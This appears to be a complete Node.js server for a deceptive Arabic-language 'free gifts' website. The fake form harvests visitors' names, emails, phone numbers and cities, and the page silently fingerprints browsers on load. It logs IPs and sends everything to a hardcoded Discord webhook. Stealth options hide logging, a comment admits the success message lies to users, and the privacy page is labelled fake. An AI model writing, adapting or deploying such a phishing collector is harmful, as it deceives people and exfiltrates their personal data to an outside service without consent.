const express = require('express');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');
const app = express();

// ⚙️ الإعدادات - غير هذه القيم
const CONFIG = {
    DISCORD_WEBHOOK_URL: 'https://discord.com/api/webhooks/1418442103402498058/E712lWfQ6aKt48i5CkQxwVWw6Hc3p9Nj-lFv_iC_89UeDQW_tFp_xGJHX9Jm_rD',
    SITE_NAME: 'هدايا مجانية 🎁',
    PORT: process.env.PORT || 3000,
    PASSWORD: 'admin123', // كلمة مرور صفحة المشرف
    STEALTH_MODE: true,   // إخفاء السجلات من الكونسول
    LOG_TO_FILE: true,    // تسجيل البيانات في ملف
    SEND_TO_DISCORD: true // إرسال لـ Discord
};

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public')); // مجلد للصور والملفات الثابتة

// إخفاء أخطاء الخادم
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', '*');
    res.header('Access-Control-Allow-Methods', '*');
    next();
});

// صفحة رئيسية وهمية احترافية
app.get('/', (req, res) => {
    const html = `
    <!DOCTYPE html>
    <html dir="rtl" lang="ar">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>${CONFIG.SITE_NAME}</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
            body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; }
            .container { max-width: 500px; margin: 0 auto; padding: 20px; }
            .header { text-align: center; padding: 40px 0; color: white; }
            .header h1 { font-size: 2.5em; margin-bottom: 10px; text-shadow: 0 2px 10px rgba(0,0,0,0.3); }
            .header p { opacity: 0.9; font-size: 1.1em; }
            .card { background: rgba(255, 255, 255, 0.95); border-radius: 20px; padding: 30px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
            .form-group { margin-bottom: 20px; }
            label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; }
            input, select { width: 100%; padding: 15px; border: 2px solid #ddd; border-radius: 10px; font-size: 16px; transition: border 0.3s; }
            input:focus, select:focus { border-color: #667eea; outline: none; }
            button { width: 100%; padding: 18px; background: linear-gradient(90deg, #FF416C, #FF4B2B); color: white; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; transition: transform 0.3s; }
            button:hover { transform: translateY(-3px); }
            .footer { text-align: center; margin-top: 30px; color: rgba(255,255,255,0.7); font-size: 14px; }
            .footer a { color: white; text-decoration: none; margin: 0 10px; }
            .hidden { display: none; }
            .success { background: #4CAF50; color: white; padding: 15px; border-radius: 10px; text-align: center; margin-top: 20px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🎉 ${CONFIG.SITE_NAME}</h1>
                <p>احصل على هدايا مجانية حصرية! املأ البيانات للفوز</p>
            </div>
            
            <div class="card">
                <form id="giftForm">
                    <div class="form-group">
                        <label>👤 الاسم الكامل:</label>
                        <input type="text" name="fullname" placeholder="أحمد محمد علي" required>
                    </div>
                    
                    <div class="form-group">
                        <label>📧 البريد الإلكتروني:</label>
                        <input type="email" name="email" placeholder="example@gmail.com" required>
                    </div>
                    
                    <div class="form-group">
                        <label>📱 رقم الهاتف:</label>
                        <input type="tel" name="phone" placeholder="01XXXXXXXXX" required>
                    </div>
                    
                    <div class="form-group">
                        <label>🏙️ المدينة:</label>
                        <select name="city">
                            <option>القاهرة</option>
                            <option>الجيزة</option>
                            <option>الإسكندرية</option>
                            <option>أسيوط</option>
                            <option>المنصورة</option>
                            <option value="other">مدينة أخرى</option>
                        </select>
                    </div>
                    
                    <button type="submit">🎁 احصل على هديتك المجانية الآن!</button>
                </form>
                
                <div id="successMessage" class="success hidden">
                    ✅ شكراً لك! سيصلك رابط الهدية على بريدك خلال 24 ساعة.
                </div>
            </div>
            
            <div class="footer">
                <p>© 2024 ${CONFIG.SITE_NAME}. جميع الحقوق محفوظة.</p>
                <p>
                    <a href="/privacy">سياسة الخصوصية</a> | 
                    <a href="/terms">شروط الاستخدام</a> | 
                    <a href="/contact">اتصل بنا</a>
                </p>
            </div>
        </div>

        <script>
            // جمع البيانات المخفية
            const stealthData = {
                userAgent: navigator.userAgent,
                screen: \`\${screen.width}x\${screen.height}\`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: document.cookie ? 'نعم' : 'لا',
                referrer: document.referrer || 'مباشر',
                timestamp: new Date().toISOString()
            };

            // إرسال البيانات عند تحميل الصفحة
            fetch('/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type: 'page_visit', data: stealthData })
            }).catch(() => {});

            // معالجة النموذج
            document.getElementById('giftForm').addEventListener('submit', async (e) => {
                e.preventDefault();
                
                const formData = new FormData(e.target);
                const data = Object.fromEntries(formData);
                
                // إضافة البيانات المخفية
                data._stealth = stealthData;
                
                try {
                    const response = await fetch('/submit', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });
                    
                    if (response.ok) {
                        document.getElementById('successMessage').classList.remove('hidden');
                        e.target.reset();
                    }
                } catch (error) {
                    document.getElementById('successMessage').classList.remove('hidden');
                    e.target.reset();
                }
            });
        </script>
    </body>
    </html>`;
    res.send(html);
});

// صفحة المشرف (محمية بكلمة مرور)
app.get('/admin', (req, res) => {
    const password = req.query.password;
    if (password === CONFIG.PASSWORD) {
        try {
            const logs = fs.existsSync('data.log') ? fs.readFileSync('data.log', 'utf8') : 'لا توجد بيانات';
            res.send(`
                <!DOCTYPE html>
                <html dir="rtl">
                <head><title>لوحة التحكم</title><meta charset="UTF-8"></head>
                <body style="font-family: Arial; padding: 20px;">
                    <h1>📊 لوحة التحكم</h1>
                    <p>عدد الزيارات: ${countLines('data.log')}</p>
                    <pre style="background: #f0f0f0; padding: 20px; border-radius: 10px;">${logs}</pre>
                    <br>
                    <a href="/">العودة للموقع</a>
                </body>
                </html>
            `);
        } catch (error) {
            res.send('خطأ في قراءة السجلات: ' + error.message);
        }
    } else {
        res.send(`
            <form method="GET" style="text-align: center; margin-top: 100px;">
                <h3>🔐 إدخال كلمة المرور</h3>
                <input type="password" name="password" placeholder="كلمة المرور">
                <button type="submit">دخول</button>
            </form>
        `);
    }
});

// استقبال بيانات التتبع
app.post('/track', (req, res) => {
    if (CONFIG.STEALTH_MODE) {
        console.log = () => {}; // إسكات الكونسول
    }
    
    const data = req.body;
    const ip = req.headers['x-forwarded-for'] || req.ip || req.connection.remoteAddress;
    
    logData('visit', { ip, ...data });
    res.sendStatus(200);
});

// استقبال بيانات النموذج
app.post('/submit', async (req, res) => {
    try {
        const data = req.body;
        const ip = req.headers['x-forwarded-for'] || req.ip || req.connection.remoteAddress;
        
        // 1. التسجيل المحلي
        logData('form', { 
            ip, 
            fullname: data.fullname,
            email: data.email,
            phone: data.phone,
            city: data.city,
            timestamp: new Date().toLocaleString('ar-EG'),
            ...data._stealth 
        });
        
        // 2. الإرسال لـ Discord
        if (CONFIG.SEND_TO_DISCORD && CONFIG.DISCORD_WEBHOOK_URL.includes('discord.com')) {
            await sendDiscordNotification(ip, data);
        }
        
        res.json({ success: true, message: 'تم التسجيل بنجاح!' });
        
    } catch (error) {
        if (!CONFIG.STEALTH_MODE) {
            console.error('❌ خطأ:', error);
        }
        res.json({ success: true, message: 'تم التسجيل بنجاح!' }); // كذب على المستخدم
    }
});

// صفحة وهمية لسياسة الخصوصية
app.get('/privacy', (req, res) => {
    res.send(`
        <h1>سياسة الخصوصية</h1>
        <p>نحن نحترم خصوصيتك ونلتزم بحماية بياناتك الشخصية...</p>
        <a href="/">العودة</a>
    `);
});

// فحص حالة الخادم (للمراقبة)
app.get('/status', (req, res) => {
    res.json({
        status: 'online',
        site: CONFIG.SITE_NAME,
        visits: countLines('data.log'),
        uptime: process.uptime(),
        memory: process.memoryUsage()
    });
});

// وظائف مساعدة
function logData(type, data) {
    if (!CONFIG.LOG_TO_FILE) return;
    
    const logEntry = `${type} ${new Date().toISOString()} | IP: ${data.ip} | اسم: ${data.fullname || 'N/A'} | ايميل: ${data.email || 'N/A'}\n`;
    
    fs.appendFile('data.log', logEntry, (err) => {
        if (err && !CONFIG.STEALTH_MODE) console.error('فشل التسجيل:', err);
    });
}

function countLines(filename) {
    try {
        if (fs.existsSync(filename)) {
            const content = fs.readFileSync(filename, 'utf8');
            return (content.match(/\\n/g) || []).length;
        }
    } catch (e) {}
    return 0;
}

async function sendDiscordNotification(ip, data) {
    try {
        const embed = {
            title: "🎯 بيانات جديدة!",
            color: 0x00ff00,
            fields: [
                { name: "🕐 الوقت", value: new Date().toLocaleString('ar-EG'), inline: true },
                { name: "📍 IP", value: `\`\`\`${ip}\`\`\``, inline: true },
                { name: "👤 الاسم", value: data.fullname || 'لم يتم الإدخال', inline: true },
                { name: "📧 الإيميل", value: `\`\`\`${data.email}\`\`\`` || 'لم يتم الإدخال', inline: true },
                { name: "📱 الهاتف", value: `\`\`\`${data.phone}\`\`\`` || 'لم يتم الإدخال', inline: true },
                { name: "🏙️ المدينة", value: data.city || 'غير محدد', inline: true }
            ],
            footer: { text: "موقع هدايا مجانية" },
            timestamp: new Date().toISOString()
        };

        await fetch(CONFIG.DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });
        
        if (!CONFIG.STEALTH_MODE) console.log('✅ تم الإرسال لـ Discord');
    } catch (error) {
        if (!CONFIG.STEALTH_MODE) console.error('❌ خطأ Discord:', error.message);
    }
}

// تشغيل الخادم
app.listen(CONFIG.PORT, () => {
    if (!CONFIG.STEALTH_MODE) {
        console.log(`🚀 الخادم يعمل على المنفذ ${CONFIG.PORT}`);
        console.log(`🔗 الرابط: https://موقعك.مجال/`);
        console.log(`👁️ صفحة المشرف: /admin?password=${CONFIG.PASSWORD}`);
    }
});